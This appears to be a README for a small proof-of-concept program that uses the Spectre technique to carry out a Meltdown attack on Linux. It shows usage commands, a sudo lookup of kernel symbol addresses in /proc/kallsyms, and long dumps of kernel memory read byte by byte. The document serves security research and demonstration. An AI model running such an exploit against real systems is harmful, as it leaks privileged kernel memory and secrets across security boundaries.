Spectre-Based Meltdown Attack
=============================
Create a tiny Meltdown proof of concept (PoC) based on Spectre attack technique.

For the detailed explanation what is Spectre, Meltdown and how the attack works,
please see 'The Spectre of Meltdowns' presentation on SlideShare:<br/>
https://www.slideshare.net/AndriyBerestovskyy/the-spectre-of-meltdowns


Expectations
------------
It is expected that the Spectre attack technique could be used to perform Meltdown attack as well. The [original Spectre paper proof of concept](https://spectreattack.com/spectre.pdf) was used as a basis for the work.


Example Usage
-------------
### Meltdown on Linux 3.13: no command line arguments
With no command line arguments, the program will try to read the content of address `0xffffffff81800040` which is the address of the Linux kernel 3.13 `linux_proc_banner` string, located inside the kernel space:

    a@b:~/p/spectre-meltdown$ gcc --version
    gcc (Ubuntu 5.4.1-2ubuntu1~16.04) 5.4.1 20160904
    [...]
    a@b:~/p/spectre-meltdown$ uname -a
    Linux b 3.13.0-85-generic #129-Ubuntu SMP Thu Mar 17 20:50:15 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux

    a@b:~/p/spectre-meltdown$ ./spectre-meltdown-99
    0xffffffff81800040 = 0x25 ('%')
    0xffffffff81800041 = 0x73 ('s')
    0xffffffff81800042 = 0x20 (' ')
    0xffffffff81800043 = 0x76 ('v')
    0xffffffff81800044 = 0x65 ('e')
    0xffffffff81800045 = 0x72 ('r')
    0xffffffff81800046 = 0x73 ('s')
    0xffffffff81800047 = 0x69 ('i')
    0xffffffff81800048 = 0x6f ('o')
    0xffffffff81800049 = 0x6e ('n')
    0xffffffff8180004a = 0x20 (' ')
    0xffffffff8180004b = 0x25 ('%')
    0xffffffff8180004c = 0x73 ('s')
    0xffffffff8180004d = 0x20 (' ')
    0xffffffff8180004e = 0x28 ('(')
    0xffffffff8180004f = 0x62 ('b')
    0xffffffff81800050 = 0x75 ('u')
    0xffffffff81800051 = 0x69 ('i')
    0xffffffff81800052 = 0x6c ('l')
    0xffffffff81800053 = 0x64 ('d')
    0xffffffff81800054 = 0x64 ('d')
    0xffffffff81800055 = 0x40 ('@')
    0xffffffff81800056 = 0x6c ('l')
    0xffffffff81800057 = 0x67 ('g')
    0xffffffff81800058 = 0x77 ('w')
    0xffffffff81800059 = 0x30 ('0')
    0xffffffff8180005a = 0x31 ('1')
    0xffffffff8180005b = 0x2d ('-')
    0xffffffff8180005c = 0x33 ('3')
    0xffffffff8180005d = 0x32 ('2')
    0xffffffff8180005e = 0x29 (')')
    0xffffffff8180005f = 0x20 (' ')
    0xffffffff81800060 = 0x28 ('(')
    0xffffffff81800061 = 0x67 ('g')
    0xffffffff81800062 = 0x63 ('c')
    0xffffffff81800063 = 0x63 ('c')
    0xffffffff81800064 = 0x20 (' ')
    0xffffffff81800065 = 0x76 ('v')
    0xffffffff81800066 = 0x65 ('e')
    0xffffffff81800067 = 0x72 ('r')
    0xffffffff81800068 = 0x73 ('s')
    0xffffffff81800069 = 0x69 ('i')
    0xffffffff8180006a = 0x6f ('o')
    0xffffffff8180006b = 0x6e ('n')
    0xffffffff8180006c = 0x20 (' ')
    0xffffffff8180006d = 0x34 ('4')
    0xffffffff8180006e = 0x2e ('.')
    0xffffffff8180006f = 0x38 ('8')
    0xffffffff81800070 = 0x2e ('.')
    0xffffffff81800071 = 0x32 ('2')
    0xffffffff81800072 = 0x20 (' ')
    0xffffffff81800073 = 0x28 ('(')
    0xffffffff81800074 = 0x55 ('U')
    0xffffffff81800075 = 0x62 ('b')
    0xffffffff81800076 = 0x75 ('u')
    0xffffffff81800077 = 0x6e ('n')
    0xffffffff81800078 = 0x74 ('t')
    0xffffffff81800079 = 0x75 ('u')
    0xffffffff8180007a = 0x20 (' ')
    0xffffffff8180007b = 0x34 ('4')
    0xffffffff8180007c = 0x2e ('.')
    0xffffffff8180007d = 0x38 ('8')
    0xffffffff8180007e = 0x2e ('.')
    0xffffffff8180007f = 0x32 ('2')
    0xffffffff81800080 = 0x2d ('-')
    0xffffffff81800081 = 0x31 ('1')
    0xffffffff81800082 = 0x39 ('9')
    0xffffffff81800083 = 0x75 ('u')
    0xffffffff81800084 = 0x62 ('b')
    0xffffffff81800085 = 0x75 ('u')
    0xffffffff81800086 = 0x6e ('n')
    0xffffffff81800087 = 0x74 ('t')
    0xffffffff81800088 = 0x75 ('u')
    0xffffffff81800089 = 0x31 ('1')
    0xffffffff8180008a = 0x29 (')')
    0xffffffff8180008b = 0x20 (' ')
    0xffffffff8180008c = 0x29 (')')
    0xffffffff8180008d = 0x20 (' ')
    0xffffffff8180008e = 0x25 ('%')
    0xffffffff8180008f = 0x73 ('s')
    0xffffffff81800090 = 0xa ('
    ')
    0xffffffff81800091 = 0x0 ('')

### Meltdown on other Linux: address of `linux_proc_banner` as an argument
It is possible to run the PoC on another versions of Linux. To do so, an address of the `linux_proc_banner` must be passed as the command line argument.

The address of the structure could be found in `/proc/kallsym` as showed below, and the `root` privileges are needed to do so:

    kda@toster ~/workspace/tmp/spectre $ uname -a
    Linux toster 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux

    kda@toster ~/workspace/tmp/spectre $ sudo cat /proc/kallsyms | grep linux_proc_banner
    ffffffff81a00060 R linux_proc_banner

    kda@toster ~/workspace/tmp/spectre $ ./spectre ffffffff81a00060
    0xffffffff81a00060 = 0x25 ('%')
    0xffffffff81a00061 = 0x73 ('s')
    0xffffffff81a00062 = 0x20 (' ')
    0xffffffff81a00063 = 0x76 ('v')
    0xffffffff81a00064 = 0x65 ('e')
    0xffffffff81a00065 = 0x72 ('r')
    0xffffffff81a00066 = 0x73 ('s')
    0xffffffff81a00067 = 0x69 ('i')
    0xffffffff81a00068 = 0x6f ('o')
    0xffffffff81a00069 = 0x6e ('n')
    0xffffffff81a0006a = 0x20 (' ')
    0xffffffff81a0006b = 0x25 ('%')
    0xffffffff81a0006c = 0x73 ('s')
    0xffffffff81a0006d = 0x20 (' ')
    0xffffffff81a0006e = 0x28 ('(')
    0xffffffff81a0006f = 0x62 ('b')
    0xffffffff81a00070 = 0x75 ('u')
    0xffffffff81a00071 = 0x69 ('i')
    0xffffffff81a00072 = 0x6c ('l')
    0xffffffff81a00073 = 0x64 ('d')
    0xffffffff81a00074 = 0x64 ('d')
    0xffffffff81a00075 = 0x40 ('@')
    0xffffffff81a00076 = 0x6c ('l')
    0xffffffff81a00077 = 0x67 ('g')
    0xffffffff81a00078 = 0x77 ('w')
    0xffffffff81a00079 = 0x30 ('0')
    0xffffffff81a0007a = 0x31 ('1')
    0xffffffff81a0007b = 0x2d ('-')
    0xffffffff81a0007c = 0x32 ('2')
    0xffffffff81a0007d = 0x31 ('1')
    0xffffffff81a0007e = 0x29 (')')
    0xffffffff81a0007f = 0x20 (' ')
    0xffffffff81a00080 = 0x28 ('(')
    0xffffffff81a00081 = 0x67 ('g')
    0xffffffff81a00082 = 0x63 ('c')
    0xffffffff81a00083 = 0x63 ('c')
    0xffffffff81a00084 = 0x20 (' ')
    0xffffffff81a00085 = 0x76 ('v')
    0xffffffff81a00086 = 0x65 ('e')
    0xffffffff81a00087 = 0x72 ('r')
    0xffffffff81a00088 = 0x73 ('s')
    0xffffffff81a00089 = 0x69 ('i')
    0xffffffff81a0008a = 0x6f ('o')
    0xffffffff81a0008b = 0x6e ('n')
    0xffffffff81a0008c = 0x20 (' ')
    0xffffffff81a0008d = 0x35 ('5')
    0xffffffff81a0008e = 0x2e ('.')
    0xffffffff81a0008f = 0x33 ('3')
    0xffffffff81a00090 = 0x2e ('.')
    0xffffffff81a00091 = 0x31 ('1')
    0xffffffff81a00092 = 0x20 (' ')
    0xffffffff81a00093 = 0x32 ('2')
    0xffffffff81a00094 = 0x30 ('0')
    0xffffffff81a00095 = 0x31 ('1')
    0xffffffff81a00096 = 0x36 ('6')
    0xffffffff81a00097 = 0x30 ('0')
    0xffffffff81a00098 = 0x34 ('4')
    0xffffffff81a00099 = 0x31 ('1')
    0xffffffff81a0009a = 0x33 ('3')
    0xffffffff81a0009b = 0x20 (' ')
    0xffffffff81a0009c = 0x28 ('(')
    0xffffffff81a0009d = 0x55 ('U')
    0xffffffff81a0009e = 0x62 ('b')
    0xffffffff81a0009f = 0x75 ('u')
    0xffffffff81a000a0 = 0x6e ('n')
    0xffffffff81a000a1 = 0x74 ('t')
    0xffffffff81a000a2 = 0x75 ('u')
    0xffffffff81a000a3 = 0x20 (' ')
    0xffffffff81a000a4 = 0x35 ('5')
    0xffffffff81a000a5 = 0x2e ('.')
    0xffffffff81a000a6 = 0x33 ('3')
    0xffffffff81a000a7 = 0x2e ('.')
    0xffffffff81a000a8 = 0x31 ('1')
    0xffffffff81a000a9 = 0x2d ('-')
    0xffffffff81a000aa = 0x31 ('1')
    0xffffffff81a000ab = 0x34 ('4')
    0xffffffff81a000ac = 0x75 ('u')
    0xffffffff81a000ad = 0x62 ('b')
    0xffffffff81a000ae = 0x75 ('u')
    0xffffffff81a000af = 0x6e ('n')
    0xffffffff81a000b0 = 0x74 ('t')
    0xffffffff81a000b1 = 0x75 ('u')
    0xffffffff81a000b2 = 0x32 ('2')
    0xffffffff81a000b3 = 0x29 (')')
    0xffffffff81a000b4 = 0x20 (' ')
    0xffffffff81a000b5 = 0x29 (')')
    0xffffffff81a000b6 = 0x20 (' ')
    0xffffffff81a000b7 = 0x25 ('%')
    0xffffffff81a000b8 = 0x73 ('s')
    0xffffffff81a000b9 = 0xa ('
    ')
    0xffffffff81a000ba = 0x0 ('')


### Spectre: pass `0` as a command line argument
To run Spectre proof of concept, pass `0` as a command line argument:

    a@b:~/p/spectre-meltdown$ ./spectre-meltdown-99 0
    0x601080 = 0x4d ('M')
    0x601081 = 0x79 ('y')
    0x601082 = 0x20 (' ')
    0x601083 = 0x70 ('p')
    0x601084 = 0x61 ('a')
    0x601085 = 0x73 ('s')
    0x601086 = 0x73 ('s')
    0x601087 = 0x77 ('w')
    0x601088 = 0x6f ('o')
    0x601089 = 0x72 ('r')
    0x60108a = 0x64 ('d')
    0x60108b = 0x0 ('')

Conclusions
-----------
The tiny (99 lines) proof of concept was created and successfully tested on few Linux kernel versions. So indeed, the Spectre attack technique could be successfully used for Meltdown attack.

'The Spectre of Meltdowns' presentation on SlideShare:<br/>
https://www.slideshare.net/AndriyBerestovskyy/the-spectre-of-meltdowns
